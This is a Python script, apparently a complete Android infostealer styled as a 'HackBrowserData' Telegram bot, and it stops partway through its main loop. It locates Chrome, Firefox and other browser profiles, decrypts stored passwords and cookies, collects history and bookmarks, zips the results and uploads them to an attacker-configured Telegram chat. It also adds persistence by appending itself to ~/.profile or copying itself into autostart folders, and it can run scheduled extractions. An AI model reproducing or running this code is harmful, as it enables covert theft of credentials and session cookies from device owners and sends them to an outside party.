#!/usr/bin/env python3
"""
HackBrowserData Telegram Bot — Android Edition
Environment: Termux, QPython3, Pydroid 3, or any Python ≥ 3.6 on Android

SETUP:
  1. Set BOT_TOKEN and CHAT_ID in the CONFIGURATION section below.
  2. Install dependencies:
       pip install requests pycryptodome
  3. Run:  python3 bot_android.py

IMPORTANT — ROOT vs NON-ROOT:
  • Non-rooted devices: browser app data (/data/data/*) is inaccessible.
    The bot can access only files visible via shared storage
    (i.e. /sdcard/Android/data if the app has exported data there),
    downloads, and Termux's own home directory.
  • Rooted devices (Termux + root): set ROOT_MODE = True to enable
    /data/data/* access for full Chrome/Firefox data extraction.

COMMANDS:
  /extract  — Collect all accessible browser data and send as ZIP
  /info     — System and environment information
  /browsers — List detected browsers/data sources
  /status   — Bot status
  /help     — This message
"""

# ========================= CONFIGURATION =========================
# ↓↓↓ FILL THESE IN BEFORE DEPLOYING ↓↓↓
BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE"   # e.g. "123456789:ABCdefGHI..."
CHAT_ID    = "YOUR_CHAT_ID_HERE"     # e.g. "987654321"
# -----------------------------------------------------------------
# Set True if running in Termux with root (tsu / su) access
ROOT_MODE = False
# Periodic auto-extraction interval in seconds; 0 = disabled
CHECK_INTERVAL = 0      # e.g. 3600 for hourly
# =================================================================

import os
import sys
import json
import base64
import shutil
import sqlite3
import tempfile
import zipfile
import platform
import subprocess
import time
import threading
import atexit
from pathlib import Path
from datetime import datetime

# ── dependency bootstrap ─────────────────────────────────────────
def _pip(*pkgs):
    """Install packages via pip; tries --user first, then plain."""
    for extra in (['--user'], []):
        try:
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q'] + extra + list(pkgs),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120
            )
            if result.returncode == 0:
                return
        except Exception:
            pass

try:
    import requests
except ImportError:
    _pip('requests')
    import requests

# Use pycryptodome (Crypto.*) — NOT pycryptodomex (Cryptodome.*)
# Both packages provide the same API; pycryptodome is the standard name.
try:
    from Crypto.Cipher   import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash     import SHA1, SHA256
except ImportError:
    _pip('pycryptodome')
    from Crypto.Cipher   import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash     import SHA1, SHA256

# ========================= TELEGRAM API ==========================

_API        = f'https://api.telegram.org/bot{BOT_TOKEN}'
_FILE_LIMIT = 49 * 1024 * 1024     # 49 MB Telegram bot limit


def _tg(method, **kwargs):
    """POST to Telegram with exponential-backoff retry (up to 5 attempts)."""
    url = f'{_API}/{method}'
    for attempt in range(5):
        try:
            # Longer timeouts on mobile networks
            r = requests.post(url, timeout=90, **kwargs)
            return r.json()
        except (requests.exceptions.ConnectionError,
                requests.exceptions.Timeout):
            wait = min(2 ** attempt * 3, 60)
            time.sleep(wait)
        except Exception:
            time.sleep(5)
    return None


def send_message(text, chat_id=None):
    """Send HTML text, chunking at 4 096 characters."""
    cid = chat_id or CHAT_ID
    for i in range(0, max(1, len(text)), 4096):
        _tg('sendMessage', data={
            'chat_id': cid, 'text': text[i:i + 4096], 'parse_mode': 'HTML'
        })


def send_file(path, chat_id=None, caption=None):
    """Upload a file; warn if it exceeds the 49 MB Telegram limit."""
    cid = chat_id or CHAT_ID
    try:
        size = os.path.getsize(path)
        if size > _FILE_LIMIT:
            send_message(
                f'⚠️ File too large ({size // 1_048_576} MB > 49 MB). '
                f'Skipping upload.', cid
            )
            return None
        # Longer timeout for file uploads on mobile
        with open(path, 'rb') as fh:
            return _tg('sendDocument',
                       data={'chat_id': cid, 'caption': caption or ''},
                       files={'document': (os.path.basename(path), fh)})
    except Exception as e:
        send_message(f'⚠️ Upload error: {e}', cid)
        return None


def get_updates(offset=None):
    url = f'{_API}/getUpdates'
    for attempt in range(3):
        try:
            r = requests.get(
                url,
                params={'timeout': 20, 'offset': offset},
                timeout=25
            )
            return r.json()
        except Exception:
            time.sleep(min(2 ** attempt * 2, 30))
    return None


def check_network():
    """Return True if the Telegram API is reachable."""
    try:
        requests.get('https://api.telegram.org', timeout=8)
        return True
    except Exception:
        return False

# ========================= ENVIRONMENT DETECTION =================


def detect_environment():
    """Return dict describing the Android Python environment."""
    env = {
        'is_termux':  'com.termux' in os.environ.get('PREFIX', ''),
        'is_qpython': os.path.exists('/sdcard/qpython'),
        'is_pydroid': os.path.exists('/sdcard/pydroid3'),
        'prefix':     os.environ.get('PREFIX', ''),
        'home':       str(Path.home()),
    }
    # Secondary Termux detection
    if not env['is_termux']:
        env['is_termux'] = (
            os.path.isdir('/data/data/com.termux') or
            '/termux' in os.environ.get('HOME', '').lower() or
            '/termux' in os.environ.get('PREFIX', '').lower()
        )
    return env


def get_temp_dir():
    """Return a writable temp directory suitable for this environment."""
    candidates = [
        Path(tempfile.gettempdir()),
        Path.home() / '.cache',
        Path('/sdcard/.tmp'),
        Path('/sdcard/Download/.tmp'),
        Path.home() / 'tmp',
    ]
    for p in candidates:
        try:
            p.mkdir(parents=True, exist_ok=True)
            test = p / '.hbd_write_test'
            test.write_text('x')
            test.unlink()
            return p
        except Exception:
            continue
    return Path(tempfile.gettempdir())   # last resort

# ========================= SYSTEM INFO ==========================


def system_info():
    env  = detect_environment()
    mode = ('Termux' if env['is_termux']
            else 'QPython' if env['is_qpython']
            else 'Pydroid' if env['is_pydroid']
            else 'System Python')
    return {
        'platform':     'Android',
        'kernel':       platform.release(),
        'arch':         platform.machine(),
        'hostname':     platform.node() or 'android-device',
        'username':     (os.environ.get('USER')
                        or os.environ.get('LOGNAME')
                        or 'android-user'),
        'home':         str(Path.home()),
        'python':       sys.version.split()[0],
        'environment':  mode,
        'root_mode':    str(ROOT_MODE),
    }

# ========================= BROWSER PATHS ========================


def _accessible_storage():
    """Return the first readable external storage path, or None."""
    for p in [
        Path('/sdcard'),
        Path('/storage/emulated/0'),
        Path.home() / 'storage' / 'shared',
        Path('/mnt/sdcard'),
    ]:
        try:
            if p.exists() and os.access(p, os.R_OK):
                return p
        except Exception:
            pass
    return None


def find_browser_paths():
    """
    Return {browser_name: [profile_path, ...]} for accessible browser data.

    Non-rooted devices: only paths reachable via shared storage.
    Rooted (ROOT_MODE=True): also checks /data/data/* for full extraction.
    """
    result  = {}
    storage = _accessible_storage()

    # ── Non-root: shared storage / exported app data ─────────────
    if storage:
        android_data = storage / 'Android' / 'data'
        # Some browsers (e.g. Kiwi, Brave) export partial data here
        browser_packages = {
            'chrome':       'com.android.chrome',
            'chrome-beta':  'com.chrome.beta',
            'brave':        'com.brave.browser',
            'edge':         'com.microsoft.emmx',
            'opera':        'com.opera.browser',
            'kiwi':         'com.kiwibrowser.browser',
            'samsung':      'com.sec.android.app.sbrowser',
            'yandex':       'com.yandex.browser',
            'uc':           'com.UCMobile.intl',
            'firefox':      'org.mozilla.firefox',
            'firefox-nightly': 'org.mozilla.fenix',
        }
        if android_data.exists():
            for browser, pkg in browser_packages.items():
                pkg_dir = android_data / pkg
                if not pkg_dir.exists():
                    continue
                # Look for recognisable data sub-directories
                for sub in ['files', 'cache', 'app_chrome/Default',
                            'app_webview', 'files/mozilla']:
                    p = pkg_dir / sub
                    if p.exists() and os.access(p, os.R_OK):
                        result.setdefault(browser, []).append(p)
                        break

    # ── Termux home directory (local Firefox profile) ─────────────
    home = Path.home()
    for ff_path in [
        home / '.mozilla' / 'firefox',
        home / 'storage' / 'shared' / '.mozilla' / 'firefox',
    ]:
        if ff_path.exists():
            result['firefox-termux'] = ff_path  # base path (profiles.ini)

    # ── Root mode: full /data/data access ─────────────────────────
    if ROOT_MODE:
        root_packages = {
            'chrome-root':       Path('/data/data/com.android.chrome/app_chrome/Default'),
            'brave-root':        Path('/data/data/com.brave.browser/app_chrome/Default'),
            'edge-root':         Path('/data/data/com.microsoft.emmx/app_chrome/Default'),
            'firefox-root':      Path('/data/data/org.mozilla.firefox/files/mozilla'),
            'firefox-nightly-root': Path('/data/data/org.mozilla.fenix/files/mozilla'),
            'samsung-root':      Path('/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default'),
        }
        for name, path in root_packages.items():
            if path.exists():
                if 'firefox' in name:
                    result[name] = path      # base dir for Firefox
                else:
                    result[name] = [path]    # single profile

    return result


def find_firefox_profiles(base_path):
    """Parse profiles.ini or fall back to scanning for *.default* dirs."""
    ini      = base_path / 'profiles.ini'
    profiles = []
    if ini.exists():
        try:
            import configparser
            cfg = configparser.ConfigParser()
            cfg.read(ini)
            for section in cfg.sections():
                if not section.lower().startswith('profile'):
                    continue
                path_val = cfg.get(section, 'Path', fallback=None)
                if path_val is None:
                    continue
                is_rel = cfg.getint(section, 'IsRelative', fallback=1)
                p = (base_path / path_val) if is_rel else Path(path_val)
                if p.exists():
                    profiles.append(p)
        except Exception:
            pass
    if not profiles:
        try:
            for item in base_path.iterdir():
                if item.is_dir() and '.default' in item.name:
                    profiles.append(item)
        except Exception:
            pass
    return profiles

# =================== CHROMIUM DECRYPTION (ANDROID) ==============


def chromium_master_key_android(browser_profile_path):
    """
    Android Chrome does NOT use a Local State encrypted_key accessible
    without root; the key is protected by Android Keystore.

    • Root mode: attempt PBKDF2 derivation (same as desktop Linux).
    • Non-root: returns None — encrypted fields cannot be decrypted.
    """
    if not ROOT_MODE:
        return None
    # On rooted Android (AOSP Chrome build), fall back to Linux-style PBKDF2
    return PBKDF2(b'peanuts', b'saltysalt', dkLen=16, count=1,
                  hmac_hash_module=SHA1)


def chromium_decrypt(blob, key):
    """Decrypt a v10/v11 AES-128-CBC Chromium field (Linux/Android style)."""
    try:
        if not blob:
            return ''
        if not key:
            return '[decryption requires root]'
        if blob[:3] in (b'v10', b'v11'):
            blob = blob[3:]
        cipher    = AES.new(key, AES.MODE_CBC, b' ' * 16)
        plaintext = cipher.decrypt(blob)
        return unpad(plaintext, 16).decode('utf-8', errors='replace')
    except Exception:
        return '[decryption failed]'


def _chrome_ts(ts):
    if not ts or ts <= 0:
        return None
    try:
        return datetime.fromtimestamp((ts - 11_644_473_600_000_000) / 1_000_000)
    except (OSError, ValueError, OverflowError):
        return None

# ===================== TEMP-DB HELPER ===========================


def _with_db(src, callback):
    tmp_dir = get_temp_dir()
    tmp     = tmp_dir / f'hbd_{os.getpid()}_{src.name}'
    try:
        shutil.copy2(src, tmp)
        conn = sqlite3.connect(str(tmp))
        try:
            return callback(conn.cursor())
        finally:
            conn.close()
    except Exception:
        return []
    finally:
        try:
            tmp.unlink()
        except Exception:
            pass

# =================== CHROMIUM EXTRACTORS ========================


def get_chromium_passwords(profile, key):
    # Try multiple possible paths for Android Chrome
    for rel in ['Login Data', 'app_chrome/Default/Login Data']:
        db = profile / rel
        if db.exists():
            break
    else:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT origin_url,username_value,password_value,'
                'date_created,date_last_used FROM logins ORDER BY date_last_used DESC'
            )
            for url, user, enc, dc, dlu in cur.fetchall():
                if user and enc:
                    rows.append({
                        'url':       url,
                        'username':  user,
                        'password':  chromium_decrypt(enc, key),
                        'created':   str(_chrome_ts(dc) or ''),
                        'last_used': str(_chrome_ts(dlu) or ''),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_cookies(profile, key):
    for rel in ['Cookies', 'Network/Cookies', 'app_chrome/Default/Cookies']:
        db = profile / rel
        if db.exists():
            break
    else:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT host_key,name,encrypted_value,path,expires_utc,'
                'is_secure,is_httponly FROM cookies ORDER BY host_key'
            )
            for host, name, enc, path, exp, sec, httpo in cur.fetchall():
                if enc:
                    rows.append({
                        'host':     host,
                        'name':     name,
                        'value':    chromium_decrypt(enc, key),
                        'path':     path,
                        'expires':  str(_chrome_ts(exp) or ''),
                        'secure':   bool(sec),
                        'httponly': bool(httpo),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_history(profile):
    for rel in ['History', 'app_chrome/Default/History']:
        db = profile / rel
        if db.exists():
            break
    else:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT url,title,visit_count,last_visit_time '
                'FROM urls ORDER BY last_visit_time DESC LIMIT 1000'
            )
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    'url': url, 'title': title or '',
                    'visits': vc, 'last_visit': str(_chrome_ts(lv) or ''),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_bookmarks(profile):
    for rel in ['Bookmarks', 'app_chrome/Default/Bookmarks']:
        bm = profile / rel
        if bm.exists():
            break
    else:
        return []
    bookmarks = []
    def _walk(node, folder=''):
        if node.get('type') == 'url':
            bookmarks.append({
                'name': node.get('name', ''), 'url': node.get('url', ''),
                'folder': folder,
            })
        elif node.get('type') == 'folder':
            sub = f"{folder}/{node.get('name','')}" if folder else node.get('name','')
            for child in node.get('children', []):
                _walk(child, sub)
    try:
        data = json.loads(bm.read_text(encoding='utf-8'))
        for root in data.get('roots', {}).values():
            if isinstance(root, dict):
                for child in root.get('children', []):
                    _walk(child)
    except Exception:
        pass
    return bookmarks

# ====================== FIREFOX DER UTILITIES ====================


def _der_next(data, pos):
    tag  = data[pos]; pos += 1
    b    = data[pos]; pos += 1
    if b < 0x80:
        length = b
    else:
        n      = b & 0x7f
        length = int.from_bytes(data[pos:pos + n], 'big')
        pos   += n
    return tag, data[pos:pos + length], pos + length


def _oid_str(raw):
    parts = [raw[0] // 40, raw[0] % 40]
    acc   = 0
    for b in raw[1:]:
        acc = (acc << 7) | (b & 0x7f)
        if not (b & 0x80):
            parts.append(acc)
            acc = 0
    return '.'.join(map(str, parts))


_OID_3DES       = '1.2.840.113549.3.7'
_OID_AES256_CBC = '2.16.840.1.101.3.4.1.42'
_OID_HMAC_SHA1  = '1.2.840.113549.2.7'


def _ff_pbes2_decrypt(blob, password=b''):
    try:
        _, outer, _      = _der_next(blob, 0)
        pos = 0
        _, alg_id, pos   = _der_next(outer, pos)
        _, ciphertext, _ = _der_next(outer, pos)

        pos = 0
        _, _oid, pos     = _der_next(alg_id, pos)
        _, params, _     = _der_next(alg_id, pos)

        pos = 0
        _, kdf_seq, pos  = _der_next(params, pos)
        _, enc_seq, _    = _der_next(params, pos)

        pos = 0
        _, _kdf_oid, pos = _der_next(kdf_seq, pos)
        _, kdf_p, _      = _der_next(kdf_seq, pos)

        pos = 0
        _, salt,     pos = _der_next(kdf_p, pos)
        _, iter_raw, pos = _der_next(kdf_p, pos)
        iterations = int.from_bytes(iter_raw, 'big')

        key_len  = 32
        hmac_mod = SHA256
        if pos < len(kdf_p):
            tag2, val2, pos2 = _der_next(kdf_p, pos)
            if tag2 == 0x02:
                key_len = int.from_bytes(val2, 'big')
                if pos2 < len(kdf_p):
                    _, prf_seq, _ = _der_next(kdf_p, pos2)
                    _, prf_oid_r, _ = _der_next(prf_seq, 0)
                    if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
                        hmac_mod = SHA1
            elif tag2 == 0x30:
                _, prf_oid_r, _ = _der_next(val2, 0)
                if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
                    hmac_mod = SHA1
                    key_len  = 24

        pos = 0
        _, enc_oid_r, pos = _der_next(enc_seq, pos)
        _, iv, _          = _der_next(enc_seq, pos)
        cipher_oid = _oid_str(enc_oid_r)

        key = PBKDF2(password, salt, dkLen=key_len, count=iterations,
                     hmac_hash_module=hmac_mod)
        if cipher_oid == _OID_3DES:
            return DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
        else:
            return AES.new(key[:key_len], AES.MODE_CBC, iv).decrypt(ciphertext)
    except Exception:
        return None


def _ff_extract_cka_value(dec):
    if len(dec) >= 102:
        return dec[70:102], _OID_AES256_CBC
    if len(dec) >= 94:
        return dec[70:94], _OID_3DES
    if len(dec) >= 32:
        return dec[-32:], _OID_AES256_CBC
    return None, None


def get_firefox_master_key(profile_path):
    key4 = profile_path / 'key4.db'
    if not key4.exists():
        return None, None

    def _q(cur):
        try:
            cur.execute("SELECT item2 FROM metadata WHERE id='password'")
            row = cur.fetchone()
            if not row:
                return None, None
            check = _ff_pbes2_decrypt(bytes(row[0]))
            if check is None or b'password-check' not in check[:20]:
                return None, None

            cur.execute(
                "SELECT name FROM sqlite_master "
                "WHERE type='table' AND name='nssPrivate'"
            )
            if not cur.fetchone():
                return None, None

            cur.execute('SELECT a11 FROM nssPrivate')
            for (a11_blob,) in cur.fetchall():
                if not a11_blob:
                    continue
                dec = _ff_pbes2_decrypt(bytes(a11_blob))
                if dec is None:
                    continue
                key, oid = _ff_extract_cka_value(dec)
                if key:
                    return key, oid
        except Exception:
            pass
        return None, None

    tmp_dir = get_temp_dir()
    tmp     = tmp_dir / f'key4_{os.getpid()}.db'
    try:
        shutil.copy2(key4, tmp)
        conn = sqlite3.connect(str(tmp))
        try:
            result = _q(conn.cursor())
        finally:
            conn.close()
        return result if result else (None, None)
    except Exception:
        return None, None
    finally:
        try:
            tmp.unlink()
        except Exception:
            pass


def _ff_decrypt_field(b64_val, key, cipher_oid):
    try:
        blob = base64.b64decode(b64_val)
        _, outer, _      = _der_next(blob, 0)
        pos = 0
        _, enc_info, pos = _der_next(outer, pos)
        _, ciphertext, _ = _der_next(outer, pos)

        pos = 0
        _, oid_r, pos = _der_next(enc_info, pos)
        _, iv, _      = _der_next(enc_info, pos)
        field_oid     = _oid_str(oid_r)

        if field_oid == _OID_3DES or cipher_oid == _OID_3DES:
            plain = DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
        else:
            plain = AES.new(key[:32], AES.MODE_CBC, iv).decrypt(ciphertext)

        pad_len = plain[-1]
        if 1 <= pad_len <= 16:
            plain = plain[:-pad_len]
        return plain.decode('utf-8', errors='replace').strip('\x00')
    except Exception:
        return '[encrypted]'

# ====================== FIREFOX EXTRACTORS =======================


def get_firefox_passwords(profile):
    logins_json = profile / 'logins.json'
    if not logins_json.exists():
        return []
    key, oid = get_firefox_master_key(profile)
    passwords = []
    try:
        data = json.loads(logins_json.read_text(encoding='utf-8'))
        for login in data.get('logins', []):
            url = login.get('formSubmitURL') or login.get('hostname', '')
            eu  = login.get('encryptedUsername', '')
            ep  = login.get('encryptedPassword', '')
            if key:
                username = _ff_decrypt_field(eu, key, oid)
                password = _ff_decrypt_field(ep, key, oid)
            else:
                username = '[root required]'
                password = '[root required]'
            tc = login.get('timeCreated')
            passwords.append({
                'url':      url,
                'username': username,
                'password': password,
                'created':  str(datetime.fromtimestamp(tc / 1000)) if tc else '',
            })
    except Exception:
        pass
    return passwords


def get_firefox_cookies(profile):
    db = profile / 'cookies.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT host,name,value,path,expiry,isSecure,isHttpOnly '
                'FROM moz_cookies ORDER BY host'
            )
            for host, name, val, path, exp, sec, httpo in cur.fetchall():
                rows.append({
                    'host': host, 'name': name, 'value': val or '',
                    'path': path,
                    'expires':  str(datetime.fromtimestamp(exp)) if exp else '',
                    'secure':   bool(sec),
                    'httponly': bool(httpo),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_history(profile):
    db = profile / 'places.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT url,title,visit_count,last_visit_date '
                'FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000'
            )
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    'url':        url,
                    'title':      title or '',
                    'visits':     vc,
                    'last_visit': str(datetime.fromtimestamp(lv / 1_000_000)) if lv else '',
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_bookmarks(profile):
    db = profile / 'places.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT b.title, p.url, b.dateAdded '
                'FROM moz_bookmarks b '
                'INNER JOIN moz_places p ON b.fk = p.id '
                'WHERE b.type = 1 ORDER BY b.dateAdded DESC'
            )
            for title, url, da in cur.fetchall():
                rows.append({
                    'name':  title or '',
                    'url':   url,
                    'added': str(datetime.fromtimestamp(da / 1_000_000)) if da else '',
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)

# ========================= DATA COLLECTION =======================


def collect_all():
    result = {
        'system':    system_info(),
        'browsers':  {},
        'timestamp': datetime.now().isoformat(),
    }
    paths = find_browser_paths()

    if not paths:
        result['note'] = (
            'No browser data found. '
            'On non-rooted Android, browser data is protected by the OS. '
            'Set ROOT_MODE=True and run in a root-capable Termux session '
            'for full data access.'
        )
        return result

    for browser, path_or_list in paths.items():
        result['browsers'][browser] = {}
        try:
            is_ff = ('firefox' in browser or 'fenix' in browser
                     or isinstance(path_or_list, Path)
                     and not isinstance(path_or_list, list))

            if is_ff and not isinstance(path_or_list, list):
                # Firefox: base path → find profiles
                base     = path_or_list
                profiles = find_firefox_profiles(base)
                for prof in profiles:
                    result['browsers'][browser][prof.name] = {
                        'passwords': get_firefox_passwords(prof),
                        'cookies':   get_firefox_cookies(prof),
                        'history':   get_firefox_history(prof),
                        'bookmarks': get_firefox_bookmarks(prof),
                    }
            else:
                # Chromium-based: list of profile paths
                profiles = path_or_list if isinstance(path_or_list, list) else [path_or_list]
                for prof in profiles:
                    key = chromium_master_key_android(prof)
                    result['browsers'][browser][prof.name] = {
                        'passwords': get_chromium_passwords(prof, key),
                        'cookies':   get_chromium_cookies(prof, key),
                        'history':   get_chromium_history(prof),
                        'bookmarks': get_chromium_bookmarks(prof),
                    }
        except Exception as e:
            result['browsers'][browser]['error'] = str(e)

    return result


def _count(data, key):
    n = 0
    for pdict in data['browsers'].values():
        for pdata in pdict.values():
            if isinstance(pdata, dict):
                n += len(pdata.get(key, []))
    return n


def make_zip(data):
    tmp_dir  = Path(tempfile.mkdtemp(dir=str(get_temp_dir())))
    try:
        files = {}
        si    = data['system']
        files['system_info.txt'] = '\n'.join(f"{k}: {v}" for k, v in si.items())
        if data.get('note'):
            files['system_info.txt'] += f"\n\nNOTE: {data['note']}"
        files['full_data.json'] = json.dumps(data, indent=2, default=str)

        for browser, prof_dict in data['browsers'].items():
            for prof_name, pdata in prof_dict.items():
                if not isinstance(pdata, dict):
                    continue
                pfx = f"{browser}_{prof_name}"

                if pdata.get('passwords'):
                    txt = f"=== {browser.upper()} — {prof_name} PASSWORDS ===\n\n"
                    for p in pdata['passwords']:
                        txt += (f"URL:      {p['url']}\n"
                                f"Username: {p['username']}\n"
                                f"Password: {p['password']}\n\n")
                    files[f"{pfx}_passwords.txt"] = txt

                if pdata.get('cookies'):
                    txt = (f"=== {browser.upper()} — {prof_name} COOKIES "
                           f"({len(pdata['cookies'])}) ===\n\n")
                    for c in pdata['cookies'][:500]:
                        txt += (f"Host:  {c['host']}\n"
                                f"Name:  {c['name']}\n"
                                f"Value: {str(c.get('value',''))[:200]}\n\n")
                    files[f"{pfx}_cookies.txt"] = txt

                if pdata.get('history'):
                    txt = (f"=== {browser.upper()} — {prof_name} HISTORY "
                           f"({len(pdata['history'])}) ===\n\n")
                    for h in pdata['history'][:500]:
                        txt += (f"URL:   {h['url']}\n"
                                f"Title: {h.get('title','')}\n"
                                f"Last:  {h.get('last_visit','')}\n\n")
                    files[f"{pfx}_history.txt"] = txt

                if pdata.get('bookmarks'):
                    txt = f"=== {browser.upper()} — {prof_name} BOOKMARKS ===\n\n"
                    for b in pdata['bookmarks']:
                        txt += (f"Name:   {b.get('name','')}\n"
                                f"URL:    {b.get('url','')}\n\n")
                    files[f"{pfx}_bookmarks.txt"] = txt

        for fname, content in files.items():
            (tmp_dir / fname).write_text(content, encoding='utf-8')

        hostname = si.get('hostname', 'android') or 'android'
        zip_name = f"android_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        zip_path = get_temp_dir() / zip_name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in tmp_dir.iterdir():
                zf.write(f, f.name)
        return zip_path
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

# ====================== BOT COMMAND HANDLERS =====================


def handle_command(text, chat_id):
    # Strip @BotName suffix and extract command word
    cmd = text.split()[0].split('@')[0].lower().strip()

    if cmd in ('/start', '/help'):
        root_note = '✓ Root mode ENABLED' if ROOT_MODE else '⚠️ Non-root (limited access)'
        send_message(
            f'<b>🤖 HackBrowserData — Android Bot</b>\n\n'
            f'{root_note}\n\n'
            '<b>Commands:</b>\n'
            '/extract  — Collect all accessible browser data (ZIP)\n'
            '/info     — System and environment information\n'
            '/browsers — List detected browsers/data\n'
            '/status   — Bot status\n'
            '/help     — This message',
            chat_id
        )

    elif cmd == '/extract':
        send_message('⏳ Collecting browser data… (this may take a moment on mobile)', chat_id)
        zip_path = None
        try:
            data     = collect_all()
            zip_path = make_zip(data)
            stats = (
                f'<b>✅ Extraction complete</b>\n\n'
                f'<b>Device:</b>      {data["system"].get("hostname")}\n'
                f'<b>Environment:</b> {data["system"].get("environment")}\n'
                f'<b>Root mode:</b>   {data["system"].get("root_mode")}\n'
                f'<b>Passwords:</b>   {_count(data,"passwords")}\n'
                f'<b>Cookies:</b>     {_count(data,"cookies")}\n'
                f'<b>History URLs:</b>{_count(data,"history")}'
            )
            if data.get('note'):
                stats += f'\n\n<i>⚠️ {data["note"]}</i>'
            send_message(stats, chat_id)
            send_file(str(zip_path), chat_id, 'Browser data')
        except Exception as e:
            send_message(f'❌ Error during extraction: {e}', chat_id)
        finally:
            if zip_path:
                try:
                    zip_path.unlink()
                except Exception:
                    pass

    elif cmd == '/info':
        info = system_info()
        send_message(
            '<b>System Information:</b>\n' +
            '\n'.join(f'<b>{k}:</b> {v}' for k, v in info.items()),
            chat_id
        )

    elif cmd == '/browsers':
        send_message('🔍 Scanning for browser data…', chat_id)
        paths = find_browser_paths()
        if not paths:
            msg = (
                '<b>No browser data found.</b>\n\n'
                '<i>On non-rooted Android, browser data is protected.\n'
                'Set ROOT_MODE=True in Termux with root access for full access.</i>'
            )
            send_message(msg, chat_id)
            return
        txt = f'<b>Accessible browser data: {len(paths)} source(s)</b>\n\n'
        for b, p in paths.items():
            if isinstance(p, list):
                txt += f'✓ <b>{b}</b> ({len(p)} location(s))\n'
            else:
                txt += f'✓ <b>{b}</b> (Firefox-based)\n'
        send_message(txt, chat_id)

    elif cmd == '/status':
        env  = detect_environment()
        mode = ('Termux' if env['is_termux']
                else 'QPython' if env['is_qpython']
                else 'Pydroid' if env['is_pydroid']
                else 'System Python')
        send_message(
            f'<b>Status:</b> ✅ Running\n'
            f'<b>Environment:</b> {mode}\n'
            f'<b>Root mode:</b> {ROOT_MODE}\n'
            f'<b>Python:</b> {sys.version.split()[0]}\n'
            f'<b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            chat_id
        )

    else:
        send_message(f'Unknown command: <code>{cmd}</code>  — use /help', chat_id)

# ========================= PERSISTENCE ==========================


def install_persistence():
    """
    Install persistence appropriate to the detected environment.
    Silently skips methods that are not available.
    """
    script = str(Path(__file__).resolve())
    interp = sys.executable
    env    = detect_environment()

    # Termux: ~/.profile or ~/.bashrc append
    if env['is_termux']:
        try:
            profile = Path.home() / '.profile'
            marker  = '# hbd-agent'
            content = profile.read_text(encoding='utf-8') if profile.exists() else ''
            if marker not in content:
                with profile.open('a') as fh:
                    fh.write(
                        f'\n{marker}\n'
                        f'(pgrep -f "{script}" || {interp} "{script}") &\n'
                    )
        except Exception:
            pass
        return

    # QPython: autostart directory
    if env['is_qpython']:
        try:
            dst = Path('/sdcard/qpython/scripts3/autostart')
            dst.mkdir(parents=True, exist_ok=True)
            target = dst / 'hbd_agent.py'
            if not target.exists():
                shutil.copy2(script, target)
        except Exception:
            pass
        return

    # Pydroid: autostart directory
    if env['is_pydroid']:
        try:
            storage = _accessible_storage()
            if storage:
                dst = storage / 'pydroid3' / 'autostart'
                dst.mkdir(parents=True, exist_ok=True)
                target = dst / 'hbd_agent.py'
                if not target.exists():
                    shutil.copy2(script, target)
        except Exception:
            pass

# ========================= LOCK FILE ============================


def _acquire_lock():
    """Return False if another instance is already running."""
    tmp_dir = get_temp_dir()
    lf      = tmp_dir / 'hbd_android.lock'
    if lf.exists():
        try:
            pid = int(lf.read_text().strip())
            os.kill(pid, 0)
            return False
        except (ProcessLookupError, PermissionError):
            pass
        except Exception:
            pass
    lf.write_text(str(os.getpid()))
    atexit.register(lambda: lf.unlink() if lf.exists() else None)
    return True

# ========================= BOT LOOP =============================


def _auto_extract():
    while True:
        time.sleep(CHECK_INTERVAL)
        try:
            data = collect_all()
            zp   = make_zip(data)
            send_message(
                f'⏰ Scheduled extraction — '
                f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            )
            send_file(str(zp), caption='Scheduled extraction')
            try:
                zp.unlink()
            except Exception:
                pass
        except Exception:
            pass


def _drain_updates():
    upd = get_updates(-1)
    if upd and upd.get('result'):
        return upd['result'][-1]['update_id'] + 1
    return None


def run_bot():
    # Wait for network on mobile
    for _ in range(12):
        if check_network():
            break
        time.sleep(5)

    si  = system_info()
    env = detect_environment()
    msg = (
        f'<b>🤖 Android Bot Online</b>\n\n'
        f'<b>Device:</b>      {si["hostname"]}\n'
        f'<b>Environment:</b> {si["environment"]}\n'
        f'<b>Root mode:</b>   {ROOT_MODE}\n'
        f'<b>Time:</b>        {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n\n'
        f'Use /help for available commands.'
    )
    send_message(msg)

    offset = _drain_updates()
    errors = 0

    while True:
        updates = get_updates(offset)
        if updates is None:
            errors += 1
            # Back off more aggressively on mobile (battery + network)
